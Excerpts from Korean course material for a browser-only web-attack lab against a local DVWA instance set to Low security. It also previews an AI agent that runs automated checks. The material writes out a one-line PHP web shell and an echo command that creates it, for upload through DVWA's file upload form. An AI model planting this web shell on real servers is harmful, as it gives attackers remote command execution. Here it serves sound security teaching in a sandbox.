...
> 🖱️ **이번 주는 100% 브라우저다.** 오늘 배우는 다섯 공격은 전부 **크롬/엣지 + F12(개발자도구)**
> 만으로 성공시킬 수 있다. 명령어를 외울 필요가 없다. 이렇게 하는 이유가 있다 —
> **사람이 무엇을 보고 무엇을 판단하는지 먼저 알아야, 다음 주에 에이전트가 그 일을 대신할 때
> "지금 얘가 뭘 하는 건지" 알아볼 수 있기 때문이다.** 도구는 사람의 절차를 빠르게 해 줄 뿐,
> 사람이 모르는 일을 대신해 주지는 않는다. (터미널이 필요한 단 한 곳, 웹셸 파일 만들기에도
> 텍스트 편집기로 하는 방법을 §5.5에 함께 적어 두었다.)
...
**정확한 페이로드.** 먼저 한 줄짜리 웹셸 파일 `shell.php` 를 만든다. **브라우저만 쓰는 학생은
텍스트 편집기(Ubuntu 텍스트 편집기 / 윈도우 메모장)를 열어** 아래 한 줄을 그대로 적고
**파일 이름을 `shell.php` 로** 저장하면 된다(윈도우 메모장은 저장할 때 "파일 형식: 모든 파일"을
골라야 `shell.php.txt` 가 되지 않는다).

```
<?php system($_GET["c"]); ?>
```

터미널이 편한 학생은 같은 파일을 이렇게 만들어도 된다 — 결과는 완전히 같다.

```bash
echo '<?php system($_GET["c"]); ?>' > shell.php
```

이 `shell.php` 를 DVWA File Upload에서 업로드한 뒤, **브라우저 주소창에** 아래 주소를 직접 입력한다.
...
> **준비.** 표적 DVWA를 띄우는 것이 실습 전체의 전제다. **학생 본인 PC**에서
> `cd infra && ./start.sh victim` 으로 DVWA를 띄운 뒤, 브라우저에서
> `http://localhost:8088`(또는 `http://<victim-ip>:8088`)에 접속한다. `admin` / `password` 로 로그인하고,
> **첫 1회**는 하단 **Create / Reset Database** 를 누른다(`./setup.sh victim` 을 썼다면 이미 되어 있다).
>
> **보안등급은 Low 로 자동 설정된다.** 좌측 **DVWA Security** 를 눌러 `low` 인지 눈으로 한 번만
> 확인하자. (혹시 다른 값이면 `low` 로 바꾸고 Submit — 등급이 Low 가 아니면 오늘 페이로드가
> 하나도 통하지 않는다.)
> (Low 여야 변수 없이 똑같은 결과가 나온다. 공격은 학생 브라우저에서, 표적은 같은 PC 의 DVWA다.)
...
**Q. 공격은 어디서 하나요?** 공격은 항상 **학생 브라우저** 에서 한다. 표적은 같은 학생 PC 에서
Docker 로 도는 DVWA(`:8088`)다. "공격자"와 "표적"이 같은 컴퓨터 안에 있을 뿐, 역할은 다르다.
...
**프롬프트를 복사 → 붙여넣기** 만 하면 **Hermes Agent** 가 정찰부터 취약점 점검, **보고서 작성**까지
...
graph TD
    ...
    W04["Week 04 — AI 에이전트가 대신<br/>프롬프트 복붙 → Hermes Agent 자동 점검"]
